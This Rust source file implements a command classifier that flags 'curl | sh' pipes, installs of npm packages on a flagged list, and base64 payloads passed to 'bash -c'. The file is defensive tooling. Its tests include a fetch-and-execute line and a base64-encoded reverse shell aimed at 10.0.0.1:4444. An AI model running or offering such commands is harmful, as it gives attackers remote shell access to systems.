//! Two-tier classifier.
//!
//! Tier 1 — regex / substring patterns. Identical surface to atty's
//! in-proc `security_guard.patterns` module so the sidecar reaches
//! the same verdict atty would have reached on its own, plus
//! whatever Tier 2 adds.
//!
//! Tier 2 — encoder SLM (SecureBERT/CodeBERT family, ONNX-INT8).
//! Stubbed in this V2-A PR: always returns `Safe` with 0.0
//! confidence so Tier-1 hits are the authoritative source until
//! V2-C wires the real model.

use crate::protocol::{Category, ClassifyResult, Verdict};
use regex::Regex;

pub struct Classifier {
    tier1: Tier1,
    tier2: Tier2,
}

impl Classifier {
    pub fn new() -> Self {
        Self {
            tier1: Tier1::new(),
            tier2: Tier2::new(),
        }
    }

    pub fn classify(&self, command: &str) -> ClassifyResult {
        if let Some(hit) = self.tier1.classify(command) {
            return hit;
        }
        self.tier2.classify(command)
    }
}

// ---------------------------------------------------------------------------
// Tier 1 — same shape as atty's `security_guard.patterns`.

struct Tier1 {
    curl_pipe_sh: Regex,
    npm_unsafe: Regex,
    bash_c: Regex,
    flagged_npm_packages: Vec<&'static str>,
}

impl Tier1 {
    fn new() -> Self {
        // `curl|sh` family. Anchored at start of token boundary
        // so we don't trip on `curlybrace…` etc. Pipe target must
        // be a known shell name AND end at a word boundary.
        let curl_pipe_sh = Regex::new(
            r"(?:^|[\s;&|])(?:curl|wget|fetch)\s.+?\|\s*(?:sh|bash|zsh|fish|dash|ksh)(?:\b|\s|$|[;|])",
        )
        .expect("curl_pipe_sh regex");

        let npm_unsafe = Regex::new(
            r"(?:^|[\s;&|])(?:npm|pnpm|yarn)\s+(?:install|i|add)\b",
        )
        .expect("npm_unsafe regex");

        // `bash -c "<arg>"` — arg captured for length+alphabet check.
        // We accept ', ", or unquoted (greedy to whitespace).
        let bash_c = Regex::new(
            r#"(?:^|[\s;&|])(?:bash|sh|zsh)\s+-c\s+(?:"([^"]+)"|'([^']+)'|(\S+))"#,
        )
        .expect("bash_c regex");

        Self {
            curl_pipe_sh,
            npm_unsafe,
            bash_c,
            flagged_npm_packages: vec![
                "event-stream",
                "flatmap-stream",
                "ua-parser-js",
                "coa",
                "rc",
                "node-ipc",
                "colors",
                "faker",
            ],
        }
    }

    fn classify(&self, line: &str) -> Option<ClassifyResult> {
        if let Some(m) = self.curl_pipe_sh.find(line) {
            return Some(ClassifyResult {
                verdict: Verdict::Warn,
                category: Category::CurlPipeSh,
                confidence: 1.0,
                reason: "remote-fetch-and-execute (`curl … | sh`)".into(),
                matched: m.as_str().trim().to_owned(),
            });
        }

        if let Some(m) = self.npm_unsafe.find(line) {
            // Walk tokens after the matched verb to check the bad-pkg list.
            let tail = &line[m.end()..];
            for tok in tail.split_whitespace() {
                if tok.starts_with('-') {
                    continue;
                }
                let name = tok.split_once('@').map(|t| t.0).unwrap_or(tok);
                if self.flagged_npm_packages.contains(&name) {
                    return Some(ClassifyResult {
                        verdict: Verdict::Warn,
                        category: Category::NpmUnsafeInstall,
                        confidence: 1.0,
                        reason: format!(
                            "`{}` is on the security_guard flagged-packages list",
                            name
                        ),
                        matched: format!("{}{}", m.as_str().trim(), &line[m.end()..]).trim().to_owned(),
                    });
                }
            }
        }

        if let Some(cap) = self.bash_c.captures(line) {
            let arg = cap
                .get(1)
                .or_else(|| cap.get(2))
                .or_else(|| cap.get(3))
                .map(|m| m.as_str())
                .unwrap_or("");
            if arg.len() >= 40 && base64_ratio(arg) >= 0.9 {
                let m = cap.get(0).unwrap();
                return Some(ClassifyResult {
                    verdict: Verdict::Warn,
                    category: Category::BashCBase64,
                    confidence: 1.0,
                    reason: "`bash -c` with a long base64-shaped payload".into(),
                    matched: m.as_str().trim().to_owned(),
                });
            }
        }

        None
    }
}

fn base64_ratio(s: &str) -> f32 {
    if s.is_empty() {
        return 0.0;
    }
    let n = s.chars().filter(|c| is_base64_char(*c)).count();
    n as f32 / s.len() as f32
}

fn is_base64_char(c: char) -> bool {
    matches!(c, 'A'..='Z' | 'a'..='z' | '0'..='9' | '+' | '/' | '=')
}

// ---------------------------------------------------------------------------
// Tier 2 — encoder SLM stub.
//
// Replaced in V2-C with an ONNX runtime + a quantized SecureBERT-class
// model. For now it always returns Safe so Tier-1 hits are the only
// signal that reaches atty.

struct Tier2;

impl Tier2 {
    fn new() -> Self {
        Self
    }
    fn classify(&self, _command: &str) -> ClassifyResult {
        ClassifyResult {
            verdict: Verdict::Safe,
            category: Category::None,
            confidence: 0.0,
            reason: String::new(),
            matched: String::new(),
        }
    }
}

// ===========================================================================
// Tests

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn curl_pipe_sh_hit() {
        let c = Classifier::new();
        let r = c.classify("curl https://x.com/install.sh | sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::CurlPipeSh));
    }

    #[test]
    fn curl_to_grep_no_hit() {
        let c = Classifier::new();
        let r = c.classify("curl https://x.com | grep token");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    #[test]
    fn npm_install_flagged() {
        let c = Classifier::new();
        let r = c.classify("npm install event-stream");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::NpmUnsafeInstall));
    }

    #[test]
    fn npm_install_clean() {
        let c = Classifier::new();
        let r = c.classify("npm install lodash express");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    #[test]
    fn pnpm_add_flagged() {
        let c = Classifier::new();
        let r = c.classify("pnpm add ua-parser-js@1.0.0");
        assert!(matches!(r.verdict, Verdict::Warn));
    }

    #[test]
    fn bash_c_base64_hit() {
        let c = Classifier::new();
        let r = c.classify(
            r#"bash -c "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK""#,
        );
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::BashCBase64));
    }

    #[test]
    fn bash_c_short_literal_no_hit() {
        let c = Classifier::new();
        let r = c.classify("bash -c 'echo hello'");
        assert!(matches!(r.verdict, Verdict::Safe));
    }
}
